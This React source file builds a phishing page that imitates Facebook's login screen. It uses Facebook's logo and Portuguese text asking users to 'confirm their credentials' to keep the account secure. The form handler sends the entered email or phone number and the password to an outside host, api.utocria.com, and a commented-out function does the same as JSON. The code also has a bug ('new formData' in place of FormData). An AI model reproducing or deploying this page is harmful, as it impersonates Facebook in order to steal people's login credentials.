import './index.css';
import { useReducer } from 'react';

function App(){

    function handleSubmit(e){
        e.preventDefault();
        const form = e.target;
        const formData = new formData(form);
        fetch("https://api.utocria.com/api/submit", {method: form.method, body:formData});
        const formJson = Object.fromEntries(formData.entries());
        console.log(formJson);
    }

/*     async function sendData(formData){
        'use server'
        const data = {
            email: formData.get('email'),
            pass: formData.get('pass')
        }
        console.log(data.email);

        await fetch("https://api.utocria.com/api/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        })
        .then((response) => response.json())
        .then((data) => console.log("Success:", data))
        .catch((error) => console.error("Error:", error));
    } */

    var inputClass = 'border border-form-border rounded-md h-10 w-64 lg:w-full px-2 hover:border-blue active:border-blue focus:border-blue focus:outline-none focus:ring focus:ring-blueRing';
    return(
        <div className="flex flex-col lg:flex-row h-auto pt-10 items-center">
            <div className="basis-1/2 lg:pl-6 pt-2 lg:pt-12 mb-5">
                <div className="pl-5 lg:pl-0 flex lg:items-start items-center flex-col">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"  className="w-3/5"></img>
                </div>
                <p className=" lg:text-start text-center px-8 lg:text-2xl text-xl font-medium text-fontColor">Confirme as suas credencias para manter a sua conta segura.</p>
            </div>
            <div className="lg:basis-1/3 w-4/5 lg:w-auto bg-white rounded-md p-4 drop-shadow-lg">
                <form onSubmit={handleSubmit} method="POST" className="flex flex-col gap-2 items-center">
                    <div className="m-2 w-96 text-center">
                        <input type="text" name="email" id="email" className={inputClass} defaultValue={''} placeholder="E-mail ou Número de Telemóvel" />
                    </div>
                    <div className="m-2 w-96 text-center">
                        <input type="password" name="pass" id="pass" className={inputClass} defaultValue={''} placeholder="Palavra-passe" />
                    </div>
                    <button type="submit" className="mx-2 bg-blue hover:bg-darkBlue text-white rounded-md p-2 w-64 lg:w-96 text-center text-xl font-semibold focus:border-blue focus:outline-none focus:ring focus:ring-blueRing">
                        Confirmar
                    </button>
                    <hr />
                    <button type="button" className="mx-2 bg-green hover:bg-darkGreen text-white rounded-md p-2 w-52 text-center text-xl font-semibold">
                        Criar Nova Conta
                    </button>
                </form>
            </div>
        </div>
    )
}

export default App;